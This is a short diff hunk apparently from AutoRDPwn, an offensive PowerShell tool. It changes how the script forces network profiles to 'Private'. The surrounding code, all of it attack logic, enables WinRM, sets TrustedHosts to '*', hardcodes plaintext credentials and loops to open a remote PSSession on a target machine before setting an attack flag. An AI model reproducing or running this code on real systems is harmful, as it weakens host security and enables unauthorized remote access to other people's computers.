@@ -499,7 +499,7 @@ function Remove-Exclusions {
 
    if($input -in '1','2','3','4','5','7'){ $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if($hash){ $user = "AutoRDPwn" ; $password = "AutoRDPwn" | ConvertTo-SecureString -AsPlainText -Force }
    $Host.UI.RawUI.ForegroundColor = 'Green' ; winrm quickconfig -force ; Set-Item wsman:\localhost\client\trustedhosts * -Force
-   Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private ; $i = 0 ; do { $i++ ; if(!$user) {
+   Set-NetConnectionProfile -InterfaceIndex ((Get-NetConnectionProfile).interfaceindex) -NetworkCategory Private ; $i = 0 ; do { $i++ ; if(!$user) {
    $RDP = New-PSSession -Computer $computer -Authentication Negotiate } ; if($user) { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
    $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate } ; $session = get-pssession ; Start-Sleep -milliseconds 500 } until ($session -or $i -eq 10) ; if ($session){ $attack = "true"
 
